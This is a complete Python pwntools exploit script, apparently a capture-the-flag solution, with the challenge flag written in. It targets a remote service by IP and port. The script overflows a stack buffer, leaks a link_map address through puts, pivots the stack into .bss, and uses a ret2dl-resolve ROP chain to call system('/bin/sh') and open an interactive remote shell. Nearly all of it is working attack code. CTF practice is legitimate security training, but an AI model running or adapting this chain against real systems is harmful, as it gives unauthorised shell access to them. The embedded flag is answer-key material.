#!/usr/bin/env python
from pwn import *
from roputils import *

flag = "vxctf{h0p3_31F_n07_y3t_ru1n_y0ur_xm45}"
ip = "35.194.142.188"
port = 8037
fpath = "./rop"
offset = 88
s = remote(ip, port)
puts_got = p64(0x601018)
libc_start_main_got = p64(0x601020)
gets_got = p64(0x601028)

gets_plt = p64(0x4004d0)
puts_plt = p64(0x4004b0)

pop_rdi_ret = p64(0x4006a3)
_start = p64(0x400500)

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x420
ptr_ret = rop.search(rop.section('.fini'))
buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['puts', rop.got()+8])
buf += _start

print(s.recvline())
print(s.recvline())
s.sendline(buf)

addr = s.recvline().strip()
addr = u64(addr.ljust(8,"\x00"))
addr_link_map = addr
addr_dt_debug = addr_link_map + 0x1c8
print(hex(addr))


buf = rop.retfill(offset)
buf += pop_rdi_ret
buf += p64(addr_dt_debug)
buf += gets_plt
buf += _start
print(s.recvline())
print(s.recvline())
s.sendline(buf)
s.sendline(p64(0))

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['gets', addr_stage]
, pivot=addr_stage)
print(s.recvline())
print(s.recvline())
s.sendline(buf)

buf = rop.call_chain_ptr(
    [ptr_ret, addr_stage+400]
)
buf += rop.dl_resolve_call(addr_stage+300)
buf += rop.fill(300, buf)
buf += rop.dl_resolve_data(addr_stage+300, 'system')
buf += rop.fill(400, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(420, buf)
s.sendline(buf)

s.interactive()
